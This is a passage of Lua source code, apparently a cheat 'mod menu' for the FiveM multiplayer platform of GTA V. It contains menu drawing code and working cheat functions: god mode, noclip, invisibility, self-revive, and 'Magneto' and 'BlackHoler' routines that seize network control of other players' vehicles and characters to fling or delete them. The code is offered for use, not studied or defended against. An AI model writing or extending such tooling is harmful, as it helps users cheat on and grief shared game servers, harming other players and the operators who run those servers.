                           c.var.colors['menu:noSelectedFeaturebackground'][1],
                           c.var.colors['menu:noSelectedFeaturebackground'][2],
                           c.var.colors['menu:noSelectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha - 105)
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noSelectedText'][1],
                    c.var.colors['menu:noSelectedText'][2],
                    c.var.colors['menu:noSelectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
                b.DrawSprite('timerbar_sr', c.var.checkbox[ew.value] and
                                 'timer_tick' or 'timer_cross',
                             c.fram.var.x + c.fram.var.g_w / 2.2,
                             c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                 c.fram.var.bHeight + c.fram.var.bHeight / 2,
                             0.01, 0.02, 0.0, c.var.colors['menu:checkbox'][1],
                             c.var.colors['menu:checkbox'][2],
                             c.var.colors['menu:checkbox'][3],
                             c.fram.var.colors.menuAlpha)
            end
        end,
        Separator = function(ew)
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if c.fram.var.UpOrDown == 'up' then
                    c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram
                                                                              .menus[c.fram
                                                                              .var
                                                                              .selectedMenu]
                                                                              .currentOption -
                                                                              1
                else
                    c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram
                                                                              .menus[c.fram
                                                                              .var
                                                                              .selectedMenu]
                                                                              .currentOption +
                                                                              1
                end
            end
            b.DrawRect(c.fram.var.x,
                       c.fram.var.y + c.fram.var.header_h / 2 + eI *
                           c.fram.var.bHeight + c.fram.var.bHeight / 2,
                       c.fram.var.g_w, c.fram.var.bHeight,
                       c.var.colors['menu:noSelectedFeaturebackground'][1],
                       c.var.colors['menu:noSelectedFeaturebackground'][2],
                       c.var.colors['menu:noSelectedFeaturebackground'][3],
                       c.fram.var.colors.menuAlpha - 105)
            c.fram.func.DrawText('[ ~w~' .. ew.title .. '~s~ ]', c.fram.var.x,
                                 c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                     c.fram.var.bHeight, {
                c.var.colors['menu:separatorBrackets'][1],
                c.var.colors['menu:separatorBrackets'][2],
                c.var.colors['menu:separatorBrackets'][3],
                c.fram.var.colors.menuAlpha
            }, 0.32, 1, true)
        end,
        ComboBox = function(ew, l)
            if #ew.labels < 1 then return end
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            local eJ = c.var.checkbox.MenuMouse and
                           c.fram.func.IsHover(c.fram.var.x,
                                               c.fram.var.y +
                                                   c.fram.var.header_h / 2 + eI *
                                                   c.fram.var.bHeight +
                                                   c.fram.var.bHeight / 2,
                                               c.fram.var.g_w,
                                               c.fram.var.bHeight)
            if eJ then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram.var
                                                                          .optionCount
            end
            c.var.combobox[ew.value] = c.var.combobox[ew.value] or 1;
            c.var.textcaches['combobox-valuelabel-' ..
                ew.labels[c.var.combobox[ew.value]]] =
                c.var.textcaches['combobox-valuelabel-' ..
                    ew.labels[c.var.combobox[ew.value]]] or
                    c.fram.func
                        .TextWidth(
                        ew.labels[c.var.combobox[ew.value]] .. ' [' ..
                            c.var.combobox[ew.value] .. '/' .. #ew.labels .. ']',
                        4, 0.35)
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if ew.description then
                    c.fram.func.Description(ew.description)
                end
                if ew.hover then
                    ew.hover(c.var.combobox[ew.value],
                             ew.labels[c.var.combobox[ew.value]])
                end
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedText'][1],
                    c.var.colors['menu:selectedText'][2],
                    c.var.colors['menu:selectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:selectedFeaturebackground'][1],
                           c.var.colors['menu:selectedFeaturebackground'][2],
                           c.var.colors['menu:selectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha)
                c.fram.func.DrawText(
                    ew.labels[c.var.combobox[ew.value]] .. ' [' ..
                        c.var.combobox[ew.value] .. '/' .. #ew.labels .. ']',
                    c.fram.var.x + c.fram.var.g_w / 2.05 -
                        c.var.textcaches['combobox-valuelabel-' ..
                            ew.labels[c.var.combobox[ew.value]]],
                    c.fram.var.y + c.fram.var.header_h / 2 + eI *
                        c.fram.var.bHeight, {
                        c.var.colors['menu:selectedText'][1],
                        c.var.colors['menu:selectedText'][2],
                        c.var.colors['menu:selectedText'][3],
                        c.fram.var.colors.menuAlpha
                    }, 0.35, 4)
                if (b.IsDisabledControlPressed(0, c.Keys['RIGHT']) or
                    b.IsDisabledControlPressed(0, c.Keys['MWHEELUP']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    c.var.combobox[ew.value] =
                        c.var.combobox[ew.value] + 1 <= #ew.labels and
                            c.var.combobox[ew.value] + 1 or 1;
                    c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                           .currTime;
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                elseif (b.IsDisabledControlPressed(0, c.Keys['LEFT']) or
                    b.IsDisabledControlPressed(0, c.Keys['MWHEELDOWN']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    c.var.combobox[ew.value] =
                        c.var.combobox[ew.value] - 1 >= 1 and
                            c.var.combobox[ew.value] - 1 or #ew.labels;
                    c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                           .currTime;
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                end
                if (b.IsDisabledControlPressed(0, c.Keys['ENTER']) or
                    b.IsDisabledControlPressed(0, c.Keys['MOUSE1']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                           .currTime;
                    a.CreateThread(function()
                        l({
                            label = ew.labels[c.var.combobox[ew.value]],
                            result = ew.results and
                                ew.results[c.var.combobox[ew.value]],
                            index = c.var.combobox[ew.value]
                        })
                    end)
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                end
            else
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:noSelectedFeaturebackground'][1],
                           c.var.colors['menu:noSelectedFeaturebackground'][2],
                           c.var.colors['menu:noSelectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha - 105)
                c.fram.func.DrawText(
                    ew.labels[c.var.combobox[ew.value]] .. ' [' ..
                        c.var.combobox[ew.value] .. '/' .. #ew.labels .. ']',
                    c.fram.var.x + c.fram.var.g_w / 2.05 -
                        c.var.textcaches['combobox-valuelabel-' ..
                            ew.labels[c.var.combobox[ew.value]]],
                    c.fram.var.y + c.fram.var.header_h / 2 + eI *
                        c.fram.var.bHeight, {
                        c.var.colors['menu:noSelectedText'][1],
                        c.var.colors['menu:noSelectedText'][2],
                        c.var.colors['menu:noSelectedText'][3],
                        c.fram.var.colors.menuAlpha
                    }, 0.35, 4)
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noSelectedText'][1],
                    c.var.colors['menu:noSelectedText'][2],
                    c.var.colors['menu:noSelectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
            end
        end,
        Display = function()
            if not c.fram.var.selectedMenu then return end
            c.fram.var.optionCount = 0;
            for k, eB in c._pairs(c.fram.var.controls) do
                b.DisableControlAction(0, eB, true)
            end
            for eL, eM in c._ipairs(c.fram.menus[c.fram.var.selectedMenu]
                                        .options) do
                c.fram.func[eM.func](eM.data, eM.result)
            end
            local eN = c.fram.var.optionCount >= c.fram.var.screenOptions and
                           c.fram.var.screenOptions or c.fram.var.optionCount;
            b.DrawSprite(c.fram.var.txdicts.header, 'header', c.fram.var.x,
                         c.fram.var.y, c.fram.var.g_w, c.fram.var.header_h, 0.0,
                         c.var.colors['menu:header'][1],
                         c.var.colors['menu:header'][2],
                         c.var.colors['menu:header'][3],
                         c.fram.var.colors.menuAlpha)
            b.DrawRect(c.fram.var.x, c.fram.var.y + c.fram.var.header_h / 2 +
                           c.fram.var.bHeight / 2, c.fram.var.g_w,
                       c.fram.var.bHeight,
                       c.var.colors['menu:subTitlebackground'][1],
                       c.var.colors['menu:subTitlebackground'][2],
                       c.var.colors['menu:subTitlebackground'][3],
                       c.fram.var.colors.menuAlpha - 15)
            b.DrawRect(c.fram.var.x,
                       c.fram.var.y + c.fram.var.header_h / 2 +
                           c.fram.var.bHeight / 2 + (eN + 1) *
                           c.fram.var.bHeight, c.fram.var.g_w,
                       c.fram.var.bHeight,
                       c.var.colors['menu:bottomsubTitlebackground'][1],
                       c.var.colors['menu:bottomsubTitlebackground'][2],
                       c.var.colors['menu:bottomsubTitlebackground'][3],
                       c.fram.var.colors.menuAlpha - 15)
            c.fram.func.DrawText(c.fram.menus[c.fram.var.selectedMenu].subTitle,
                                 c.fram.var.x,
                                 c.fram.var.y + c.fram.var.header_h / 2, {
                c.var.colors['menu:subTitleText'][1],
                c.var.colors['menu:subTitleText'][2],
                c.var.colors['menu:subTitleText'][3],
                c.fram.var.colors.menuAlpha
            }, 0.32, 1, true)
            if b.IsDisabledControlPressed(0, c.Keys['DOWN']) and
                c.fram.var.timers.currTime - c.fram.var.timers.scrolling.time >=
                c.fram.var.timers.scrolling.delay then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram
                                                                          .menus[c.fram
                                                                          .var
                                                                          .selectedMenu]
                                                                          .currentOption <=
                                                                          c.fram
                                                                              .var
                                                                              .optionCount -
                                                                          1 and
                                                                          c.fram
                                                                              .menus[c.fram
                                                                              .var
                                                                              .selectedMenu]
                                                                              .currentOption +
                                                                          1 or 1;
                c.fram.var.timers.scrolling.time = c.fram.var.timers.currTime;
                c.fram.var.UpOrDown = 'down'
                if c.var.checkbox['ui_sounds'] then
                    b.PlaySoundFrontend(-1, 'HIGHLIGHT_NAV_UP_DOWN',
                                        'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                end
            elseif b.IsDisabledControlPressed(0, c.Keys['UP']) and
                c.fram.var.timers.currTime - c.fram.var.timers.scrolling.time >=
                c.fram.var.timers.scrolling.delay then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram
                                                                          .menus[c.fram
                                                                          .var
                                                                          .selectedMenu]
                                                                          .currentOption -
                                                                          1 >= 1 and
                                                                          c.fram
                                                                              .menus[c.fram
                                                                              .var
                                                                              .selectedMenu]
                                                                              .currentOption -
                                                                          1 or
                                                                          c.fram
                                                                              .var
                                                                              .optionCount;
                c.fram.var.timers.scrolling.time = c.fram.var.timers.currTime;
                c.fram.var.UpOrDown = 'up'
                if c.var.checkbox['ui_sounds'] then
                    b.PlaySoundFrontend(-1, 'HIGHLIGHT_NAV_UP_DOWN',
                                        'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                end
            elseif b.IsDisabledControlPressed(0, c.Keys['BACKSPACE']) and
                c.fram.var.timers.currTime - c.fram.var.timers.scrolling.time >=
                c.fram.var.timers.scrolling.delay then
                if c.fram.var.selectedMenu == 'MainMenu' then
                    c.fram.shouldShow = false
                else
                    c.fram.var.selectedMenu =
                        c.fram.menus[c.fram.var.selectedMenu].parent;
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'CONTINUE',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                end
                c.fram.var.timers.scrolling.time = c.fram.var.timers.currTime
            end
            if c.fram.menus[c.fram.var.selectedMenu].func then
                c.fram.menus[c.fram.var.selectedMenu].func()
            end
            if c.var.checkbox.MenuMouse then
                local E, F = b.GetNuiCursorPosition()
                local eG, eH = b.GetActiveScreenResolution()
                c.fram.var.mpos.x = E / eG;
                c.fram.var.mpos.y = F / eH;
                b.SetMouseCursorActiveThisFrame()
                b.DisableControlAction(0, 24, true)
                b.DisableControlAction(0, 25, true)
                b.DisableControlAction(0, c.Keys['TAB'], true)
            end
            if b.IsDisabledControlJustPressed(0, c.Keys['G']) then
                c.var.checkbox.MenuMouse = not c.var.checkbox.MenuMouse
            end
        end,
        Notify = function(type, eO, c7)
            c._table.insert(c.fram.var.NotificationsQueue,
                            {type = type, text = eO .. '.', color = c7})
        end,
        NotificationsMain = function()
            a.CreateThread(function()
                local eP = {w = 0.011, h = b.GetAspectRatio() * 0.011}
                while c.fram.enabled do
                    a.Wait(10)
                    if c.fram.var.NotificationsQueue[1] then
                        local s = c.fram.func.TextWidth(c.fram.var
                                                            .NotificationsQueue[1]
                                                            .text, 4, 0.335) +
                                      0.001;
                        local c7 = {16, 16, 57}
                        if c.fram.var.NotificationsQueue[1].color then
                            c7 = c.fram.var.NotificationsQueue[1].color or c7
                        elseif c.fram.var.NotificationsQueue[1].type == 'error' then
                            c7 = {255, 0, 0, 255}
                        elseif c.fram.var.NotificationsQueue[1].type ==
                            'success' then
                            c7 = {0, 255, 0, 255}
                        end
                        for ev = 0, s, 0.004 do
                            a.Wait(0)
                            b.DrawRect(0.5, 0.05, ev, 0.025, 10, 10, 10, 255)
                            b.DrawRect(0.5, 0.0375, ev, 0.001, c7[1], c7[2],
                                       c7[3], 255)
                        end
                        for ev = 0, 255, 3 do
                            a.Wait(0)
                            b.DrawRect(0.5, 0.05, s, 0.025, 10, 10, 10, 255)
                            b.DrawRect(0.5, 0.0375, s, 0.001, c7[1], c7[2],
                                       c7[3], 255)
                            c.fram.func.DrawText(
                                c.fram.var.NotificationsQueue[1].text, 0.5,
                                0.037, {255, 255, 255, ev}, 0.33, 4, true)
                        end
                        for ev = 1, 50 do
                            a.Wait(0)
                            b.DrawRect(0.5, 0.05, s, 0.025, 10, 10, 10, 255)
                            b.DrawRect(0.5, 0.0375, s, 0.001, c7[1], c7[2],
                                       c7[3], 255)
                            c.fram.func.DrawText(
                                c.fram.var.NotificationsQueue[1].text, 0.5,
                                0.037, {255, 255, 255, 255}, 0.33, 4, true)
                        end
                        for ev = 255, 0, -3 do
                            a.Wait(0)
                            b.DrawRect(0.5, 0.05, s, 0.025, 10, 10, 10, 255)
                            b.DrawRect(0.5, 0.0375, s, 0.001, c7[1], c7[2],
                                       c7[3], 255)
                            c.fram.func.DrawText(
                                c.fram.var.NotificationsQueue[1].text, 0.5,
                                0.037, {255, 255, 255, ev}, 0.33, 4, true)
                        end
                        for ev = s, 0, -0.004 do
                            a.Wait(0)
                            b.DrawRect(0.5, 0.05, ev, 0.025, 10, 10, 10, 255)
                            b.DrawRect(0.5, 0.0375, ev, 0.001, c7[1], c7[2],
                                       c7[3], 255)
                        end
                        a.Wait(250)
                        c._table.remove(c.fram.var.NotificationsQueue, 1)
                    end
                end
            end)
        end
    }
    c.func = {
        TableContain = function(table, eQ)
            for eR, c1 in c._pairs(table) do
                if c1 == eQ then return true end
            end
            return false
        end,
        B_Revive = function()
            b.StopScreenEffect('DeathFailOut')
            b.SetEntityHealth(b.PlayerPedId(), 200)
            b.ClearPedBloodDamage(b.PlayerPedId())
            local c8 = b.GetEntityCoords(b.PlayerPedId())
            b.SetEntityCoordsNoOffset(b.PlayerPedId(), c8.x, c8.y, c8.z, false,
                                      false, false, true)
            b.NetworkResurrectLocalPlayer(c8.x, c8.y, c8.z, heading, true, false)
            c.func.TriggerCustomEvent(false, 'playerSpawned', c8.x, c8.y, c8.z)
            b.ClearPedBloodDamage(b.PlayerPedId())
        end,
        B_Suicide = function() b.SetEntityHealth(b.PlayerPedId(), 0) end,
        B_RefillHealth = function()
            local Q = b.PlayerPedId()
            b.SetEntityHealth(Q, b.GetEntityMaxHealth(Q))
        end,
        B_RefillArmour = function() b.SetPedArmour(b.PlayerPedId(), 100) end,
        C_SuperJump = function()
            while c.var.checkbox.SuperJump do
                a.Wait(0)
                b.SetSuperJumpThisFrame(b.PlayerId(), true)
            end
        end,
        C_InfiniteCombatRoll = function()
            for ev = 0, 3 do
                b.StatSetInt(b.GetHashKey('mp' .. ev .. '_shooting_ability'),
                             c.var.checkbox.InfiniteCombatRoll and 9999 or 0,
                             true)
                b.StatSetInt(b.GetHashKey('sp' .. ev .. '_shooting_ability'),
                             c.var.checkbox.InfiniteCombatRoll and 9999 or 0,
                             true)
            end
        end,
        C_NoCriticals = function()
            while c.var.checkbox.NoCriticals do
                a.Wait(0)
                b.SetPedSuffersCriticalHits(b.PlayerPedId(), false)
            end
            b.SetPedSuffersCriticalHits(b.PlayerPedId(), true)
        end,
        C_MoveOnWater = function()
            local eS, eT, eU, eV;
            local Q = b.PlayerPedId()
            local E, F, G = c._table.unpack(b.GetEntityCoords(Q))
            while c.var.checkbox.MoveOnWater do
                a.Wait(0)
                eU, eV = b.GetWaterHeight(E, F, G, G)
                if b.IsPedInAnyVehicle(Q, false) then
                    local eW = b.GetVehiclePedIsIn(Q, false)
                    E, F, G = c._table.unpack(b.GetEntityCoords(eW))
                    eS = b.GetEntityHeading(eW)
                else
                    E, F, G = c._table.unpack(b.GetEntityCoords(Q))
                    eS = b.GetEntityHeading(Q)
                end
                if not eT or not b.DoesEntityExist(eT) then
                    eT = b.CreateObject(b.GetHashKey('prop_lev_des_barge_01'),
                                        E, F, eV - 4.0, true, false, false)
                    b.SetEntityAlpha(eT, 0, true)
                    b.SetEntityDynamic(eT, false)
                end
                b.SetEntityCoords(eT, E, F, eV - 2.0)
                b.SetEntityRotation(eT, 0.0, 180.0, -eS, 1, true)
            end
            b.DeleteEntity(eT)
        end,
        C_NoRagdoll = function()
            while c.var.checkbox.NoRagdoll do
                a.Wait(0)
                b.SetPedCanRagdoll(b.PlayerPedId(), false)
            end
            b.SetPedCanRagdoll(b.PlayerPedId(), true)
        end,
        C_NoClip = function()
            local Q = b.PlayerPedId()
            local eX = b.IsPedInAnyVehicle(Q, 0)
            local k = nil;
            local E, F, G = nil;
            local eY, eZ = 1, 1;
            if not eX then
                k = Q;
                E, F, G = c._table.unpack(b.GetEntityCoords(Q, 2))
            else
                k = b.GetVehiclePedIsIn(Q, 0)
                E, F, G = c._table.unpack(b.GetEntityCoords(Q, 1))
            end
            while c.var.checkbox.NoClip do
                a.Wait(0)
                local e_, f0, f1 = c.fram.func.getcamdirection()
                b.SetEntityVisible(b.PlayerPedId(), 0, 0)
                b.SetEntityVisible(k, 0, 0)
                b.SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
                if b.IsDisabledControlJustPressed(0, 21) then
                    eZ = eY;
                    eY = eY * 5
                end
                if b.IsDisabledControlJustReleased(0, 21) then
                    eY = eZ
                end
                if b.IsDisabledControlPressed(0, 32) then
                    E = E + eY * e_;
                    F = F + eY * f0;
                    G = G + eY * f1
                end
                if b.IsDisabledControlPressed(0, 269) then
                    E = E - eY * e_;
                    F = F - eY * f0;
                    G = G - eY * f1
                end
                if b.IsDisabledControlPressed(0, 22) then
                    G = G + eY
                end
                if b.IsDisabledControlPressed(0, 36) then
                    G = G - eY
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['E']) then
                    eY = eY + 0.5
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['Q']) then
                    eY = eY - 0.5
                end
                b.SetEntityCoordsNoOffset(k, E, F, G, true, true, true)
                c.fram.func.DrawText('Speed: ' .. eY, 0.5, 0.95,
                                     {255, 255, 255, 255}, 0.45, 4, true)
            end
            local eX = b.IsPedInAnyVehicle(b.PlayerPedId(), 0)
            local k = nil;
            local E, F, G = nil;
            if not eX then
                k = Q;
                E, F, G = c._table.unpack(b.GetEntityCoords(Q, 2))
            else
                k = b.GetVehiclePedIsIn(Q, 0)
                E, F, G = c._table.unpack(b.GetEntityCoords(Q, 1))
            end
            for ev = 1, 5 do
                b.SetEntityVisible(k, 1, 1)
                b.SetEntityVisible(Q, 1, 1)
            end
            if not eX then
                local f2 = 10000;
                while f2 ~= 0 do
                    b.SetPedCanRagdoll(Q, false)
                    f2 = f2 - 10;
                    a.Wait(10)
                end
                b.SetPedCanRagdoll(Q, true)
            end
        end,
        C_InfiniteStamina = function()
            while c.var.checkbox.InfiniteStamina do
                a.Wait(0)
                b.RestorePlayerStamina(b.PlayerId(), 1.0)
            end
        end,
        C_Invisible = function()
            local Q = b.PlayerPedId()
            while c.var.checkbox.Invisible do
                a.Wait(0)
                b.SetEntityVisible(Q, false, false)
            end
            b.SetEntityVisible(Q, true, true)
        end,
        C_GodMode = function()
            local Q = b.PlayerPedId()
            local f3 = b.PlayerId()
            while c.var.checkbox.GodMode do
                a.Wait(0)
                b.SetPlayerInvincible(f3, true)
                b.SetEntityInvincible(Q, true)
                b.SetEntityProofs(Q, true, true, true, true, true)
            end
            b.SetPlayerInvincible(f3, false)
            b.SetEntityInvincible(Q, false)
            b.SetEntityProofs(Q, false, false, false, false, false)
        end,
        C_SemiGodMode = function()
            while c.var.checkbox.SemiGodMode do
                a.Wait(5)
                local Q = b.PlayerPedId()
                b.SetEntityHealth(Q, b.GetEntityMaxHealth(Q))
            end
        end,
        B_StopAnimation = function() b.ClearPedTasks(b.PlayerPedId()) end,
        RequestAnimDict = function(f4, f5)
            if not b.HasAnimDictLoaded(f4) then
                b.RequestAnimDict(f4)
                while not b.HasAnimDictLoaded(f4) do
                    b.RequestAnimDict(f4)
                    a.Wait(1)
                end
            end
            if f5 then f5() end
        end,
        RequestAnimSet = function(f6, f5)
            if not b.HasAnimSetLoaded(f6) then
                b.RequestAnimSet(f6)
                while not b.HasAnimSetLoaded(f6) do a.Wait(1) end
            end
            if f5 then f5() end
        end,
        RunAnimation = function(Q, type, ew)
            a.CreateThread(function()
                if type == 'anim' then
                    c.func.RequestAnimDict(ew.lib, function()
                        b.TaskPlayAnim(Q, ew.lib, ew.anim, 8.0, -8.0, -1, 0, 0,
                                       false, false, false)
                    end)
                elseif type == 'scenario' then
                    b.TaskStartScenarioInPlace(Q, ew.anim, 0, false)
                elseif type == 'attitude' then
                    c.func.RequestAnimSet(ew.lib, function()
                        b.SetPedMovementClipset(Q, ew.anim, true)
                    end)
                end
            end)
        end,
        EnumerateEntities = function(f7, f8, f9)
            return c._coroutine.wrap(function()
                local fa, f3 = f7()
                if not f3 or f3 == 0 then
                    f9(fa)
                    return
                end
                local fb = {handle = fa, destructor = f9}
                local fc = true;
                c._setmetatable(fb, entityEnumerator)
                repeat
                    c._coroutine.yield(f3)
                    fc, f3 = f8(fa)
                until not fc;
                fb.destructor, fb.handle = nil, nil;
                f9(fa)
            end)
        end,
        EnumeratePeds = function()
            return c.func.EnumerateEntities(b.FindFirstPed, b.FindNextPed,
                                            b.EndFindPed)
        end,
        EnumerateVehicles = function()
            return c.func.EnumerateEntities(b.FindFirstVehicle,
                                            b.FindNextVehicle, b.EndFindVehicle)
        end,
        EnumerateProps = function()
            return c.func.EnumerateEntities(b.FindFirstObject, b.FindNextObject,
                                            b.EndFindObject)
        end,
        EnumeratePickups = function()
            return c.func.EnumerateEntities(b.FindNextPickup, b.FindNextPickup,
                                            b.EndFindPickup)
        end,
        EnumeratePedsByDistance = function(c8)
            local fd = {}
            for dc in c.func.EnumeratePeds() do
                c._table.insert(fd, {
                    ped = dc,
                    distance = #(c8 - b.GetEntityCoords(dc))
                })
            end
            c._table.sort(fd, function(P, O)
                return P.distance < O.distance
            end)
            return fd
        end,
        C_Magneto = function()
            local fe = false;
            local ax = 18;
            local ff;
            local Q = b.PlayerPedId()
            local function fg(fh)
                local fi = fh.z * 0.0174532924;
                local fj = fh.x * 0.0174532924;
                local fk = c._math.abs(c._math.cos(fj))
                return c._vector3(-c._math.sin(fi) * fk, c._math.cos(fi) * fk,
                                  c._math.sin(fj))
            end
            local function fl(_, fm, fn, fo)
                b.ApplyForceToEntity(_, 3,
                                     (fm - b.GetEntityCoords(_)) * fn ^ 2 -
                                         (c._vector3(0.0, 0.0, 0.1) +
                                             b.GetEntityVelocity(_) * 2 * fn *
                                             fo), 0, 0, 0, false, false, true,
                                     true, false, true)
            end
            while c.var.checkbox.Magneto do
                a.Wait(0)
                b.DisableControlAction(0, c.Keys['TAB'], true)
                if b.IsDisabledControlJustPressed(0, c.Keys['E']) then
                    fe = not fe;
                    if not fe then
                        local fp = b.GetGameplayCamRot(2)
                        local fq = 10;
                        local fr = -(c._math.sin(c._math.rad(fp.z)) * fq * 10)
                        local fs = c._math.cos(c._math.rad(fp.z)) * fq * 10;
                        local ft = fq * fp.x * 0.2;
                        for k in c.func.EnumerateVehicles() do
                            b.SetEntityInvincible(k, false)
                            if b.IsEntityOnScreen(k) and
                                b.GetVehiclePedIsIn(Q, false) ~= k then
                                b.ApplyForceToEntity(k, 1, fr, fs, ft, 0, 0, 0,
                                                     true, false, true, true,
                                                     true, true)
                            end
                        end
                        for k in c.func.EnumeratePeds() do
                            if b.IsEntityOnScreen(k) and k ~= Q then
                                b.ApplyForceToEntity(k, 1, fr, fs, ft, 0, 0, 0,
                                                     true, false, true, true,
                                                     true, true)
                            end
                        end
                    end
                end
                if fe then
                    ff = b.GetGameplayCamCoord() + fg(b.GetGameplayCamRot(2)) *
                             ax;
                    b.DrawMarker(28, ff, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.5, 1.5,
                                 1.5, 15, 15, 60, 200)
                    for k in c.func.EnumerateVehicles() do
                        b.SetEntityInvincible(k, true)
                        if b.IsEntityOnScreen(k) and
                            b.GetVehiclePedIsIn(Q, false) ~= k then
                            b.NetworkRequestControlOfEntity(k)
                            b.FreezeEntityPosition(k, false)
                            fl(k, ff, 0.5, 0.3)
                        end
                    end
                    for k in c.func.EnumeratePeds() do
                        b.SetEntityInvincible(k, true)
                        if b.IsEntityOnScreen(k) and Q ~= k then
                            b.NetworkRequestControlOfEntity(k)
                            b.FreezeEntityPosition(k, false)
                            fl(k, ff, 0.5, 0.3)
                        end
                    end
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['MWHEELUP']) then
                    ax = ax + 3
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['MWHEELDOWN']) then
                    if ax - 3 > 3 then ax = ax - 3 end
                end
            end
        end,
        C_BlackHoler = function()
            local fe = false;
            local ax = 18;
            local ff;
            local Q = b.PlayerPedId()
            local function fg(fh)
                local fi = fh.z * 0.0174532924;
                local fj = fh.x * 0.0174532924;
                local fk = c._math.abs(c._math.cos(fj))
                return c._vector3(-c._math.sin(fi) * fk, c._math.cos(fi) * fk,
                                  c._math.sin(fj))
            end
            local function fl(_, fm, fn, fo)
                b.ApplyForceToEntity(_, 3,
                                     (fm - b.GetEntityCoords(_)) * fn ^ 2 -
                                         (c._vector3(0.0, 0.0, 0.1) +
                                             b.GetEntityVelocity(_) * 2 * fn *
                                             fo), 0, 0, 0, false, false, true,
                                     true, false, true)
            end
            while c.var.checkbox.BlackHoler do
                a.Wait(0)
                b.DisableControlAction(0, c.Keys['TAB'], true)
                if b.IsDisabledControlJustPressed(0, c.Keys['E']) then
                    fe = not fe
                end
                if fe then
                    ff = b.GetGameplayCamCoord() + fg(b.GetGameplayCamRot(2)) *
                             ax;
                    b.DrawMarker(28, ff, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.5, 1.5,
                                 1.5, 10, 10, 10, 200)
                    for k in c.func.EnumerateVehicles() do
                        b.SetEntityInvincible(k, true)
                        if b.IsEntityOnScreen(k) and
                            b.GetVehiclePedIsIn(Q, false) ~= k then
                            b.NetworkRequestControlOfEntity(k)
                            b.FreezeEntityPosition(k, false)
                            fl(k, ff, 0.5, 0.3)
                            if b.GetDistanceBetweenCoords(ff,
                                                          b.GetEntityCoords(k),
                                                          true) < 5 then
                                b.DeleteEntity(k)
                            end
                        end
                    end
                    for k in c.func.EnumeratePeds() do
                        b.SetEntityInvincible(k, true)
                        if b.IsEntityOnScreen(k) and Q ~= k then
                            b.NetworkRequestControlOfEntity(k)
                            b.FreezeEntityPosition(k, false)
                            fl(k, ff, 0.5, 0.3)
                            if b.GetDistanceBetweenCoords(ff,
                                                          b.GetEntityCoords(k),
                                                          true) < 5 then
                                b.DeleteEntity(k)
                            end
                        end
                    end
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['MWHEELUP']) then
                    ax = ax + 3
                end
                if b.IsDisabledControlJustPressed(0, c.Keys['MWHEELDOWN']) then
                    if ax - 3 > 3 then ax = ax - 3 end
                end
            end
        end,
        C_Hulk = function()
            local vehicle = 0;
            local Q = b.PlayerPedId()
